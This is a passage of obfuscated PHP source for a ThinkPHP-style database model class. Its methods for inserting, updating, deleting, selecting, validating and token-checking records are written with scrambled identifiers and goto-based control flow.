array($CÙ¸öÒÑ‰, $aáÂêÈííµ)); if (!is_null($bĞ«°ŒåÊ–) && $bĞ«°ŒåÊ– !== !1) { return $bĞ«°ŒåÊ–; } } goto BÌŸÃÀö¶á; FĞõ˜…§: $CÙ¸öÒÑ‰ = $FàÁº—šÁ‰; if (is_array($FàÁº—šÁ‰)) { $CÙ¸öÒÑ‰ = $FàÁº—šÁ‰[1]; $FàÁº—šÁ‰ = $FàÁº—šÁ‰[0]; } $cÎĞÎ›…• = count($aáÂêÈííµ) - 1; goto C¥øÊ¥Ì…¢; bÆ‚Ìë—Ùé: $e¢šÎğ‘šì =& $_SERVER[¼]; $aáÂêÈííµ = func_get_args(); $FàÁº—šÁ‰ = array_shift($aáÂêÈííµ); goto FĞõ˜…§; Fñê°¢–ƒà: } protected function _initialize() { } protected function _facade($E¦ÔÕ±¯³) { $B¥ààÆáí =& $_SERVER[¼]; if (!empty($this->fields)) { foreach ($E¦ÔÕ±¯³ as $F§Í‘˜¹Ã => $AõåÕÈ¨ß‡) { if (!in_array($F§Í‘˜¹Ã, $this->fields, !0)) { unset($E¦ÔÕ±¯³[$F§Í‘˜¹Ã]); } elseif (is_scalar($AõåÕÈ¨ß‡)) { $this->_parseType($E¦ÔÕ±¯³, $F§Í‘˜¹Ã); } } } if (!empty($this->options[$B¥ààÆáí[255]])) { $E¦ÔÕ±¯³ = array_map($this->options[$B¥ààÆáí[255]], $E¦ÔÕ±¯³); unset($this->options[$B¥ààÆáí[255]]); } $this->_beforeWrite($E¦ÔÕ±¯³); return $E¦ÔÕ±¯³; } protected function _beforeWrite(&$bÁ¹Æ¶ç‚æ) { } public function add($E¥ÔˆÑĞ„± = '', $a‚Ê‡–å = array(), $D•Èš’†ß† = false) { goto FÎà·Éæâ‚; EŠ ´Š´¦: return $eÖµ¾·ˆù©; goto AÎÌÔÑè Š; b•–½Ú‡¬: if (!1 === $this->_beforeInsert($E¥ÔˆÑĞ„±, $a‚Ê‡–å)) { return !1; } $eÖµ¾·ˆù© = $this->db->insert($E¥ÔˆÑĞ„±, $a‚Ê‡–å, $D•Èš’†ß†); if (!1 !== $eÖµ¾·ˆù©) { $F‘óíå¢î˜ = $this->getLastInsID(); if ($F‘óíå¢î˜) { $E¥ÔˆÑĞ„±[$this->getPk()] = $F‘óíå¢î˜; $this->_after_insert($E¥ÔˆÑĞ„±, $a‚Ê‡–å); return $F‘óíå¢î˜; } $this->_after_insert($E¥ÔˆÑĞ„±, $a‚Ê‡–å); } goto EŠ ´Š´¦; FÎà·Éæâ‚: if (empty($E¥ÔˆÑĞ„±)) { if (!empty($this->data)) { $E¥ÔˆÑĞ„± = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¼][256]); return !1; } } $a‚Ê‡–å = $this->_parseOptions($a‚Ê‡–å); $E¥ÔˆÑĞ„± = $this->_facade($E¥ÔˆÑĞ„±); goto b•–½Ú‡¬; AÎÌÔÑè Š: } protected function _beforeInsert(&$bñ¸Á³÷ƒŸ, $dÜÃ‡¾‹Šœ) { } protected function _after_insert($BˆŠñ†Óé³, $Fòğ­ˆÆº) { } public function addAll($fçƒİ±•¾, $bè¢†“ÇçÖ = array(), $c¯À¢ªŠºŞ = false) { goto d£„¾å„¸Ø; c¸Ô…Òµ¹Õ: foreach ($fçƒİ±•¾ as $E×¬ùÊ£Æ => $C· ˆÅŒ˜) { $fçƒİ±•¾[$E×¬ùÊ£Æ] = $this->_facade($C· ˆÅŒ˜); } if (method_exists($this->db, $EÒæÚù›°[257])) { $c­‹»²¬° = $this->db->insertAll($fçƒİ±•¾, $bè¢†“ÇçÖ, $c¯À¢ªŠºŞ); } else { $this->startTrans(); foreach ($fçƒİ±•¾ as $E×¬ùÊ£Æ => $C· ˆÅŒ˜) { $c­‹»²¬° = $this->db->insert($C· ˆÅŒ˜, $bè¢†“ÇçÖ, $c¯À¢ªŠºŞ); } $this->commit(); } if (!1 !== $c­‹»²¬°) { $D…µŠ¡ô· = $this->getLastInsID(); if ($D…µŠ¡ô·) { return $D…µŠ¡ô·; } } goto f®ˆíÓ½ŒÓ; d£„¾å„¸Ø: $EÒæÚù›° =& $_SERVER[¼]; if (empty($fçƒİ±•¾)) { $this->error = think_lang($EÒæÚù›°[256]); return !1; } $bè¢†“ÇçÖ = $this->_parseOptions($bè¢†“ÇçÖ); goto c¸Ô…Òµ¹Õ; f®ˆíÓ½ŒÓ: return $c­‹»²¬°; goto f˜º…²æ¼; f˜º…²æ¼: } public function selectAdd($dÎá•Èéã = '', $E…Ò¤İÍÊ = '', $e¢÷ƒÄ£Á = array()) { $CÀ½Ì’‡ÊĞ =& $_SERVER[¼]; $e¢÷ƒÄ£Á = $this->_parseOptions($e¢÷ƒÄ£Á); if (!1 === ($Då£Šˆ¶›Ï = $this->db->selectInsert($dÎá•Èéã ? $dÎá•Èéã : $e¢÷ƒÄ£Á[$CÀ½Ì’‡ÊĞ[258]], $E…Ò¤İÍÊ ? $E…Ò¤İÍÊ : $this->getTableName(), $e¢÷ƒÄ£Á))) { $this->error = think_lang($CÀ½Ì’‡ÊĞ[259]); return !1; } else { return $Då£Šˆ¶›Ï; } } public function save($B“ò‚‰åâë = '', $EÇªÅ™âÖÌ = array()) { goto fÃÌæ×§Æ; E†İ’¨Ô‚: $EÇªÅ™âÖÌ = $this->_parseOptions($EÇªÅ™âÖÌ); $fğË¥¼èÙÂ = $this->getPk(); if (!isset($EÇªÅ™âÖÌ[$EÆÕäÔ™³[260]])) { if (isset($B“ò‚‰åâë[$fğË¥¼èÙÂ])) { $aøÓƒˆ¶Ï[$fğË¥¼èÙÂ] = $B“ò‚‰åâë[$fğË¥¼èÙÂ]; $EÇªÅ™âÖÌ[$EÆÕäÔ™³[260]] = $aøÓƒˆ¶Ï; unset($B“ò‚‰åâë[$fğË¥¼èÙÂ]); } else { $this->error = think_lang($EÆÕäÔ™³[259]); return !1; } } goto Cåö¼èš‹É; Cåö¼èš‹É: if (is_array($EÇªÅ™âÖÌ[$EÆÕäÔ™³[260]]) && isset($EÇªÅ™âÖÌ[$EÆÕäÔ™³[260]][$fğË¥¼èÙÂ])) { $e°×ŠªÉ„ = $EÇªÅ™âÖÌ[$EÆÕäÔ™³[260]][$fğË¥¼èÙÂ]; } if (!1 === $this->_beforeUpdate($B“ò‚‰åâë, $EÇªÅ™âÖÌ)) { return !1; } $FĞÃÀƒ¿å˜ = $this->db->update($B“ò‚‰åâë, $EÇªÅ™âÖÌ); goto f–×¦çÖáÊ; f–×¦çÖáÊ: if (!1 !== $FĞÃÀƒ¿å˜) { if (isset($e°×ŠªÉ„)) { $B“ò‚‰åâë[$fğË¥¼èÙÂ] = $e°×ŠªÉ„; } $this->_afterUpdate($B“ò‚‰åâë, $EÇªÅ™âÖÌ); } return $FĞÃÀƒ¿å˜; goto a©ã»¾; fÃÌæ×§Æ: $EÆÕäÔ™³ =& $_SERVER[¼]; if (empty($B“ò‚‰åâë)) { if (!empty($this->data)) { $B“ò‚‰åâë = $this->data; $this->data = array(); } else { $this->error = think_lang($EÆÕäÔ™³[256]); return !1; } } $B“ò‚‰åâë = $this->_facade($B“ò‚‰åâë); goto E†İ’¨Ô‚; a©ã»¾: } protected function _beforeUpdate(&$CŒâœ‘É×£, $a›ê¹šÑ§²) { } protected function _afterUpdate($a¾ß„¸ÁóÙ, $AŠæä†¶³ä) { } public function delete($a˜£Å®íçµ = array()) { goto f†¤¦·øç¹; f†¤¦·øç¹: $D¶Œª¢ÊÌ =& $_SERVER[¼]; if (empty($a˜£Å®íçµ) && empty($this->options[$D¶Œª¢ÊÌ[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $a‚ÉÜ’œÓ = $this->getPk(); goto Aå×È£Éİ; F•ÛÊ‹•–„: $CÂô°ªŸ³á = $this->db->delete($a˜£Å®íçµ); if (!1 !== $CÂô°ªŸ³á) { $CÙèÂÛ ‘ = array(); if (isset($cÜÆŞ¼õÎ™)) { $CÙèÂÛ ‘[$a‚ÉÜ’œÓ] = $cÜÆŞ¼õÎ™; } $this->_after_delete($CÙèÂÛ ‘, $a˜£Å®íçµ); } return $CÂô°ªŸ³á; goto d³¨²ğÅŒÃ; Aå×È£Éİ: if (is_numeric($a˜£Å®íçµ) || is_string($a˜£Å®íçµ)) { if (strpos($a˜£Å®íçµ, $D¶Œª¢ÊÌ[47])) { $cóÊµÀ¿Î[$a‚ÉÜ’œÓ] = array($D¶Œª¢ÊÌ[261], $a˜£Å®íçµ); } else { $cóÊµÀ¿Î[$a‚ÉÜ’œÓ] = $a˜£Å®íçµ; } $this->options[$D¶Œª¢ÊÌ[260]] = $cóÊµÀ¿Î; } $a˜£Å®íçµ = $this->_parseOptions(); if (is_array($a˜£Å®íçµ[$D¶Œª¢ÊÌ[260]]) && isset($a˜£Å®íçµ[$D¶Œª¢ÊÌ[260]][$a‚ÉÜ’œÓ])) { $cÜÆŞ¼õÎ™ = $a˜£Å®íçµ[$D¶Œª¢ÊÌ[260]][$a‚ÉÜ’œÓ]; } goto F•ÛÊ‹•–„; d³¨²ğÅŒÃ: } protected function _after_delete($bòÚ¦‰øğá, $eÚ†Ò ¡) { } public function select($B•ŞÕ›äõ = array()) { goto Eê¡Ú–Ã é; cŒÕË¹Œ­Ü: $this->_afterSelect($føñ¥Ø¬Û, $B•ŞÕ›äõ); return $føñ¥Ø¬Û; goto Bœİ•¦Ö“; c‹ç´Ù²Ô: $føñ¥Ø¬Û = $this->db->select($B•ŞÕ›äõ); if (!1 === $føñ¥Ø¬Û) { return !1; } if (empty($føñ¥Ø¬Û)) { return null; } goto cŒÕË¹Œ­Ü; Eê¡Ú–Ã é: $AœìÄø†¶Ë =& $_SERVER[¼]; if (is_string($B•ŞÕ›äõ) || is_numeric($B•ŞÕ›äõ)) { $Bˆ™ìÑÁ‚ = $this->getPk(); if (strpos($B•ŞÕ›äõ, $AœìÄø†¶Ë[47])) { $d¨ß´¥ÌŠ’[$Bˆ™ìÑÁ‚] = array($AœìÄø†¶Ë[261], $B•ŞÕ›äõ); } else { $d¨ß´¥ÌŠ’[$Bˆ™ìÑÁ‚] = $B•ŞÕ›äõ; } $this->options[$AœìÄø†¶Ë[260]] = $d¨ß´¥ÌŠ’; } elseif (!1 === $B•ŞÕ›äõ) { $B•ŞÕ›äõ = $this->_parseOptions(); return $AœìÄø†¶Ë[262] . $this->db->buildSelectSql($B•ŞÕ›äõ) . $AœìÄø†¶Ë[263]; } $B•ŞÕ›äõ = $this->_parseOptions(); goto c‹ç´Ù²Ô; Bœİ•¦Ö“: } protected function _afterSelect(&$fÒ×ó©ˆŒ, $b¼°ä¹¬ù) { } public function buildSql($CŸçÅ¢Î¶÷ = array()) { $Eƒø¬Ö¢®æ =& $_SERVER[¼]; $CŸçÅ¢Î¶÷ = $this->_parseOptions($CŸçÅ¢Î¶÷); return $Eƒø¬Ö¢®æ[262] . $this->db->buildSelectSql($CŸçÅ¢Î¶÷) . $Eƒø¬Ö¢®æ[263]; } public function optionsValue($dÅ‚·£†’ = null) { if (is_null($dÅ‚·£†’)) { return $this->options; } elseif (is_array($dÅ‚·£†’)) { $this->options = array_merge($this->options, $dÅ‚·£†’); } } protected function _parseOptions($E¢¹Ôçœ› = array()) { goto Eœ´«¥¾¹È; aÂŸŒİáöÃ: if (!isset($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[264]])) { $E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[264]] = $this->getTableName(); $e‘‹ƒœ‘ó = $this->fields; } else { $e‘‹ƒœ‘ó = $this->getDbFields(); } if (!empty($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[265]])) { $E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[264]] .= $f¿ñ®…Ó·Ë[50] . $E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[265]]; } $E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[266]] = $this->name; goto C†ƒÍù²Ÿâ; C†ƒÍù²Ÿâ: if (isset($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[260]]) && is_array($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[260]]) && !empty($e‘‹ƒœ‘ó) && !isset($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[267]]) && !isset($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[264]])) { foreach ($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[260]] as $EÕçÔŒõŒ => $CÛ¿˜×–š’) { $EÕçÔŒõŒ = trim($EÕçÔŒõŒ); if (in_array($EÕçÔŒõŒ, $e‘‹ƒœ‘ó, !0)) { if (is_scalar($CÛ¿˜×–š’)) { $this->_parseType($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[260]], $EÕçÔŒõŒ); } } elseif (!is_numeric($EÕçÔŒõŒ) && $f¿ñ®…Ó·Ë[70] != substr($EÕçÔŒõŒ, 0, 1) && !1 === strpos($EÕçÔŒõŒ, $f¿ñ®…Ó·Ë[93]) && !1 === strpos($EÕçÔŒõŒ, $f¿ñ®…Ó·Ë[245]) && !1 === strpos($EÕçÔŒõŒ, $f¿ñ®…Ó·Ë[268]) && !1 === strpos($EÕçÔŒõŒ, $f¿ñ®…Ó·Ë[269])) { unset($E¢¹Ôçœ›[$f¿ñ®…Ó·Ë[260]][$EÕçÔŒõŒ]); } } } $this->_options_filter($E¢¹Ôçœ›); return $E¢¹Ôçœ›; goto a™ãæ±‡õÅ; Eœ´«¥¾¹È: $f¿ñ®…Ó·Ë =& $_SERVER[¼]; if (is_array($E¢¹Ôçœ›)) { $E¢¹Ôçœ› = array_merge($this->options, $E¢¹Ôçœ›); } $this->options = array(); goto aÂŸŒİáöÃ; a™ãæ±‡õÅ: } protected function _options_filter(&$dª‰Óµ–ñÊ) { } protected function _parseType(&$cğªïè¸×Ö, $eÓÎ©ˆµ¤Ş) { $BàëöÎÁó =& $_SERVER[¼]; if (empty($this->options[$BàëöÎÁó[270]][$BàëöÎÁó[4] . $eÓÎ©ˆµ¤Ş])) { $a—½Û«œå´ = strtolower($this->fields[$BàëöÎÁó[237]][$eÓÎ©ˆµ¤Ş]); if (!1 !== strpos($a—½Û«œå´, $BàëöÎÁó[271])) { } elseif (!1 === strpos($a—½Û«œå´, $BàëöÎÁó[272]) && !1 !== strpos($a—½Û«œå´, $BàëöÎÁó[273])) { $cğªïè¸×Ö[$eÓÎ©ˆµ¤Ş] = intval($cğªïè¸×Ö[$eÓÎ©ˆµ¤Ş]); } elseif (!1 !== strpos($a—½Û«œå´, $BàëöÎÁó[274]) || !1 !== strpos($a—½Û«œå´, $BàëöÎÁó[275])) { $cğªïè¸×Ö[$eÓÎ©ˆµ¤Ş] = floatval($cğªïè¸×Ö[$eÓÎ©ˆµ¤Ş]); } elseif (!1 !== strpos($a—½Û«œå´, $BàëöÎÁó[276])) { $cğªïè¸×Ö[$eÓÎ©ˆµ¤Ş] = (bool) $cğªïè¸×Ö[$eÓÎ©ˆµ¤Ş]; } } } public function find($FÙ½ÚŒíÈ‡ = array()) { goto d¬ÕÛº°è”; bö™Á¶İÀ›: if (!empty($this->options[$DÀô‚ŠÛİ[278]])) { return $this->returnResult($this->data, $this->options[$DÀô‚ŠÛİ[278]]); } return $this->data; goto Bô‰ÛÑŠë; CóÊ½–¾¼: $FÙ½ÚŒíÈ‡ = $this->_parseOptions(); $eˆ‘©í„Ë = $this->db->select($FÙ½ÚŒíÈ‡); if (!1 === $eˆ‘©í„Ë) { return !1; } goto C ´¦¹“»ë; C ´¦¹“»ë: if (empty($eˆ‘©í„Ë)) { return null; } $this->data = $eˆ‘©í„Ë[0]; $this->_afterFind($this->data, $FÙ½ÚŒíÈ‡); goto bö™Á¶İÀ›; d¬ÕÛº°è”: $DÀô‚ŠÛİ =& $_SERVER[¼]; if (is_numeric($FÙ½ÚŒíÈ‡) || is_string($FÙ½ÚŒíÈ‡)) { $eñ‰®ÈÁ†Ø[$this->getPk()] = intval($FÙ½ÚŒíÈ‡); $this->options[$DÀô‚ŠÛİ[260]] = $eñ‰®ÈÁ†Ø; } $this->options[$DÀô‚ŠÛİ[277]] = 1; goto CóÊ½–¾¼; Bô‰ÛÑŠë: } protected function _afterFind(&$E±‡±£’©Î, $B“¼øš”šô) { } protected function returnResult($Cœ´…ëÛÔ¬, $dâîªöï˜ = '') { $dØåÆíçÇ =& $_SERVER[¼]; if ($dâîªöï˜) { if (is_callable($dâîªöï˜)) { return call_user_func($dâîªöï˜, $Cœ´…ëÛÔ¬); } switch (strtolower($dâîªöï˜)) { case $dØåÆíçÇ[279]: return json_encode($Cœ´…ëÛÔ¬); case $dØåÆíçÇ[280]: return xml_encode($Cœ´…ëÛÔ¬); } } return $Cœ´…ëÛÔ¬; } public function parseFieldsMap($eò¥‡¥ÒÂ¾, $FŸéè’Õ•¶ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $d›¦à¿ƒ => $CÔ›®œ·Ùğ) { if ($FŸéè’Õ•¶ == 1) { if (isset($eò¥‡¥ÒÂ¾[$CÔ›®œ·Ùğ])) { $eò¥‡¥ÒÂ¾[$d›¦à¿ƒ] = $eò¥‡¥ÒÂ¾[$CÔ›®œ·Ùğ]; unset($eò¥‡¥ÒÂ¾[$CÔ›®œ·Ùğ]); } } else { if (isset($eò¥‡¥ÒÂ¾[$d›¦à¿ƒ])) { $eò¥‡¥ÒÂ¾[$CÔ›®œ·Ùğ] = $eò¥‡¥ÒÂ¾[$d›¦à¿ƒ]; unset($eò¥‡¥ÒÂ¾[$d›¦à¿ƒ]); } } } } return $eò¥‡¥ÒÂ¾; } public function setField($cçÁ¾ÅšŒ©, $CĞà®Œ« = '') { if (is_array($cçÁ¾ÅšŒ©)) { $c£Õ”×âéŠ = $cçÁ¾ÅšŒ©; } else { $c£Õ”×âéŠ[$cçÁ¾ÅšŒ©] = $CĞà®Œ«; } return $this->save($c£Õ”×âéŠ); } public function setAdd($eØ¸æ„‘¡•, $f¶ £È‹¹ª = 1) { $Bß¸’ñô» =& $_SERVER[¼]; $Bóˆ®…Î¢ = $eØ¸æ„‘¡• . $Bß¸’ñô»[281] . $f¶ £È‹¹ª; if ($f¶ £È‹¹ª < 0) { $Bóˆ®…Î¢ = $eØ¸æ„‘¡• . $f¶ £È‹¹ª; } return $this->setField($eØ¸æ„‘¡•, array($Bß¸’ñô»[282], $Bóˆ®…Î¢)); } public function getField($Eù–‹¾˜‡, $cÖ›…õ‹Ì = null) { $c°ƒª§½Ğ‘ =& $_SERVER[¼]; $E®Ëòš¢‚¦[$c°ƒª§½Ğ‘[258]] = $Eù–‹¾˜‡; $E®Ëòš¢‚¦ = $this->_parseOptions($E®Ëòš¢‚¦); $Eù–‹¾˜‡ = trim($Eù–‹¾˜‡); if (strpos($Eù–‹¾˜‡, $c°ƒª§½Ğ‘[47])) { if (!isset($E®Ëòš¢‚¦[$c°ƒª§½Ğ‘[277]])) { $E®Ëòš¢‚¦[$c°ƒª§½Ğ‘[277]] = is_numeric($cÖ›…õ‹Ì) ? $cÖ›…õ‹Ì : $c°ƒª§½Ğ‘[33]; } $EïĞ¹¨„ùõ = $this->db->select($E®Ëòš¢‚¦); if (!empty($EïĞ¹¨„ùõ)) { goto a›ÓŠ‚ŞŒ; B¿Ùœğ†: foreach ($EïĞ¹¨„ùõ as $DÄ—Û™Ó…) { $a¾Š°”Š§– = $DÄ—Û™Ó…[$e¾øÖèÜÅ]; if (2 == $d´³Å’Í) { $FÖ’µíÖ²Š[$a¾Š°”Š§–] = $DÄ—Û™Ó…[$eŠ‹…ÖÜ§›]; } else { $FÖ’µíÖ²Š[$a¾Š°”Š§–] = is_string($cÖ›…õ‹Ì) ? implode($cÖ›…õ‹Ì, $DÄ—Û™Ó…) : $DÄ—Û™Ó…; } } return $FÖ’µíÖ²Š; goto DñÍÒ‚šÒØ; a›ÓŠ‚ŞŒ: $cÄÂ‹Ù­» = explode($c°ƒª§½Ğ‘[47], $Eù–‹¾˜‡); $Eù–‹¾˜‡ = array_keys($EïĞ¹¨„ùõ[0]); $e¾øÖèÜÅ = array_shift($Eù–‹¾˜‡); goto DœÃ†˜¸Û; DœÃ†˜¸Û: $eŠ‹…ÖÜ§› = array_shift($Eù–‹¾˜‡); $FÖ’µíÖ²Š = array(); $d´³Å’Í = count($cÄÂ‹Ù­»); goto B¿Ùœğ†; DñÍÒ‚šÒØ: } } else { if (!0 !== $cÖ›…õ‹Ì) { $E®Ëòš¢‚¦[$c°ƒª§½Ğ‘[277]] = is_numeric($cÖ›…õ‹Ì) ? $cÖ›…õ‹Ì : 1; } if ($cÖ›…õ‹Ì === $c°ƒª§½Ğ‘[240]) { unset($E®Ëòš¢‚¦[$c°ƒª§½Ğ‘[277]]); } $DÄ—Û™Ó… = $this->db->select($E®Ëòš¢‚¦); if (!empty($DÄ—Û™Ó…)) { if ($cÖ›…õ‹Ì === $c°ƒª§½Ğ‘[240]) { return reset($DÄ—Û™Ó…[0]); } if (!0 !== $cÖ›…õ‹Ì && 1 == $E®Ëòš¢‚¦[$c°ƒª§½Ğ‘[277]]) { return reset($DÄ—Û™Ó…[0]); } foreach ($DÄ—Û™Ó… as $a·åèÓ¦‚×) { $dò¹Ôîœ©[] = $a·åèÓ¦‚×[$Eù–‹¾˜‡]; } return $dò¹Ôîœ©; } } return null; } public function create($B»¥„ê¼£ë = '', $D´îĞ´†âÅ = '') { goto a†Õ ö©¢‹; a†Õ ö©¢‹: $d˜ñÅ‹„œ¬ =& $_SERVER[¼]; if (empty($B»¥„ê¼£ë)) { $B»¥„ê¼£ë = $_POST; } elseif (is_object($B»¥„ê¼£ë)) { $B»¥„ê¼£ë = get_object_vars($B»¥„ê¼£ë); } if (empty($B»¥„ê¼£ë) || !is_array($B»¥„ê¼£ë)) { $this->error = think_lang($d˜ñÅ‹„œ¬[256]); return !1; } goto aò£ç®ÒĞø; aò£ç®ÒĞø: $B»¥„ê¼£ë = $this->parseFieldsMap($B»¥„ê¼£ë, 0); $D´îĞ´†âÅ = $D´îĞ´†âÅ ? $D´îĞ´†âÅ : (!empty($B»¥„ê¼£ë[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$d˜ñÅ‹„œ¬[258]])) { $FùºŞ™”•Ì = $this->options[$d˜ñÅ‹„œ¬[258]]; unset($this->options[$d˜ñÅ‹„œ¬[258]]); } elseif ($D´îĞ´†âÅ == THINK_MODEL_INSERT && isset($this->insertFields)) { $FùºŞ™”•Ì = $this->insertFields; } elseif ($D´îĞ´†âÅ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $FùºŞ™”•Ì = $this->updateFields; } goto FğÂ‰œ³è; EŠ™éòÊ®: if ($this->autoCheckFields) { $FùºŞ™”•Ì = $this->getDbFields(); foreach ($B»¥„ê¼£ë as $FÖÄ¸èô÷Š => $f„Ñ±Æ•ĞÛ) { if (!in_array($FÖÄ¸èô÷Š, $FùºŞ™”•Ì)) { unset($B»¥„ê¼£ë[$FÖÄ¸èô÷Š]); } elseif (MAGIC_QUOTES_GPC && is_string($f„Ñ±Æ•ĞÛ)) { $B»¥„ê¼£ë[$FÖÄ¸èô÷Š] = stripslashes($f„Ñ±Æ•ĞÛ); } } } $this->autoOperation($B»¥„ê¼£ë, $D´îĞ´†âÅ); $this->data = $B»¥„ê¼£ë; goto b‡ì¢¾Óš; b‡ì¢¾Óš: return $B»¥„ê¼£ë; goto EÓ¦ëœ¯«–; FğÂ‰œ³è: if (isset($FùºŞ™”•Ì)) { if (is_string($FùºŞ™”•Ì)) { $FùºŞ™”•Ì = explode($d˜ñÅ‹„œ¬[47], $FùºŞ™”•Ì); } if (think_config($d˜ñÅ‹„œ¬[283])) { $FùºŞ™”•Ì[] = think_config($d˜ñÅ‹„œ¬[284]); } foreach ($B»¥„ê¼£ë as $FÖÄ¸èô÷Š => $f„Ñ±Æ•ĞÛ) { if (!in_array($FÖÄ¸èô÷Š, $FùºŞ™”•Ì)) { unset($B»¥„ê¼£ë[$FÖÄ¸èô÷Š]); } } } if (!$this->autoValidation($B»¥„ê¼£ë, $D´îĞ´†âÅ)) { return !1; } if (!$this->autoCheckToken($B»¥„ê¼£ë)) { $this->error = think_lang($d˜ñÅ‹„œ¬[285]); return !1; } goto EŠ™éòÊ®; EÓ¦ëœ¯«–: } public function autoCheckToken($bÌÏ‹á˜òˆ) { $f’ÆÛ£ğµ =& $_SERVER[¼]; if (isset($this->options[$f’ÆÛ£ğµ[286]]) && !$this->options[$f’ÆÛ£ğµ[286]]) { return !0; } if (think_config($f’ÆÛ£ğµ[283])) { $bĞÜ™ÚÆÑØ = think_config($f’ÆÛ£ğµ[284]); if (!isset($bÌÏ‹á˜òˆ[$bĞÜ™ÚÆÑØ]) || Session::get($bĞÜ™ÚÆÑØ)) { return !1; } list($A”ˆ†Ê†²Ø, $EÀ¹…íĞ«Æ) = explode($f’ÆÛ£ğµ[70], $bÌÏ‹á˜òˆ[$bĞÜ™ÚÆÑØ]); if ($EÀ¹…íĞ«Æ && Session::get($bĞÜ™ÚÆÑØ . $f’ÆÛ£ğµ[93] . $A”ˆ†Ê†²Ø) === $EÀ¹…íĞ«Æ) { Session::remove($bĞÜ™ÚÆÑØ . $f’ÆÛ£ğµ[93] . $A”ˆ†Ê†²Ø); return !0; } if (think_config($f’ÆÛ£ğµ[287])) { Session::remove($bĞÜ™ÚÆÑØ . $f’ÆÛ£ğµ[93] . $A”ˆ†Ê†²Ø); } return !1; } return !0; } public function regex($fëŠñ±¼ß, $DÓù¡Ğ‹§Í) { $D—æ¬„äõ =& $_SERVER[¼]; $eÌíÑ·àØ = array($D—æ¬„äõ[288] => $D—æ¬„äõ[289], $D—æ¬„äõ[290] => $D—æ¬„äõ[291], $D—æ¬„äõ[292] => $D—æ¬„äõ[293], $D—æ¬„äõ[294] => $D—æ¬„äõ[295], $D—æ¬„äõ[296] => $D—æ¬„äõ[297], $D—æ¬„äõ[298] => $D—æ¬„äõ[299], $D—æ¬„äõ[300] => $D—æ¬„äõ[301], $D—æ¬„äõ[275] => $D—æ¬„äõ[302], $D—æ¬„äõ[303] => $D—æ¬„äõ[304]); if (isset($eÌíÑ·àØ[strtolower($DÓù¡Ğ‹§Í)])) { $DÓù¡Ğ‹§Í = $eÌíÑ·àØ[strtolower($DÓù¡Ğ‹§Í)]; } return preg_match($DÓù¡Ğ‹§Í, $fëŠñ±¼ß) === 1; } private function autoOperation(&$B´Ôõ¾”×¸, $e„ä¶âùÔß) { $b½‹ßáãôÄ =& $_SERVER[¼]; if (!empty($this->options[$b½‹ßáãôÄ[305]])) { $EŞ•ƒ–’‰‡ = $this->options[$b½‹ßáãôÄ[305]]; unset($this->options[$b½‹ßáãôÄ[305]]); } elseif (!empty($this->_auto)) { $EŞ•ƒ–’‰‡ = $this->_auto; } if (isset($EŞ•ƒ–’‰‡)) { foreach ($EŞ•ƒ–’‰‡ as $dĞ³àÖ­®) { if (empty($dĞ³àÖ­®[2])) { $dĞ³àÖ­®[2] = THINK_MODEL_INSERT; } if ($e„ä¶âùÔß == $dĞ³àÖ­®[2] || $dĞ³àÖ­®[2] == THINK_MODEL_BOTH) { switch (trim($dĞ³àÖ­®[3])) { case $b½‹ßáãôÄ[306]: case $b½‹ßáãôÄ[307]: $d÷‹°óÔ¨ = isset($dĞ³àÖ­®[4]) ? (array) $dĞ³àÖ­®[4] : array(); if (isset($B´Ôõ¾”×¸[$dĞ³àÖ­®[0]])) { array_unshift($d÷‹°óÔ¨, $B´Ôõ¾”×¸[$dĞ³àÖ­®[0]]); } if ($b½‹ßáãôÄ[306] == $dĞ³àÖ­®[3]) { $B´Ôõ¾”×¸[$dĞ³àÖ­®[0]] = call_user_func_array($dĞ³àÖ­®[1], $d÷‹°óÔ¨); } else { $B´Ôõ¾”×¸[$dĞ³àÖ­®[0]] = call_user_func_array(array(&$this, $dĞ³àÖ­®[1]), $d÷‹°óÔ¨); } break; case $b½‹ßáãôÄ[258]: $B´Ôõ¾”×¸[$dĞ³àÖ­®[0]] = $B´Ôõ¾”×¸[$dĞ³àÖ­®[1]]; break; case $b½‹ßáãôÄ[308]: if ($b½‹ßáãôÄ[33] === $B´Ôõ¾”×¸[$dĞ³àÖ­®[0]]) { unset($B´Ôõ¾”×¸[$dĞ³àÖ­®[0]]); } break; case $b½‹ßáãôÄ[309]: default: $B´Ôõ¾”×¸[$dĞ³àÖ­®[0]] = $dĞ³àÖ­®[1]; } if (!1 === $B´Ôõ¾”×¸[$dĞ³àÖ­®[0]]) { unset($B´Ôõ¾”×¸[$dĞ³àÖ­®[0]]); } } } } return $B´Ôõ¾”×¸; } protected function autoValidation($Fğ–½®½Õ±, $e­¢‚‘³Ë³) { $e±¬ãÄ‚ïŠ =& $_SERVER[¼]; if (!empty($this->options[$e±¬ãÄ‚ïŠ[310]])) { $E¬ñ·ãÀë = $this->options[$e±¬ãÄ‚ïŠ[310]]; unset($this->options[$e±¬ãÄ‚ïŠ[310]]); } elseif (!empty($this->_validate)) { $E¬ñ·ãÀë = $this->_validate; } if (isset($E¬ñ·ãÀë)) { if ($this->patchValidate) { $this->error = array(); } foreach ($E¬ñ·ãÀë as $a¤”â£Í™Ç => $DÑÒñŞè•ê) { if (empty($DÑÒñŞè•ê[5]) || $DÑÒñŞè•ê[5] == THINK_MODEL_BOTH || $DÑÒñŞè•ê[5] == $e­¢‚‘³Ë³) { if (0 == strpos($DÑÒñŞè•ê[2], $e±¬ãÄ‚ïŠ[311]) && strpos($DÑÒñŞè•ê[2], $e±¬ãÄ‚ïŠ[312])) { $DÑÒñŞè•ê[2] = think_lang(substr($DÑÒñŞè•ê[2], 2, -1)); } 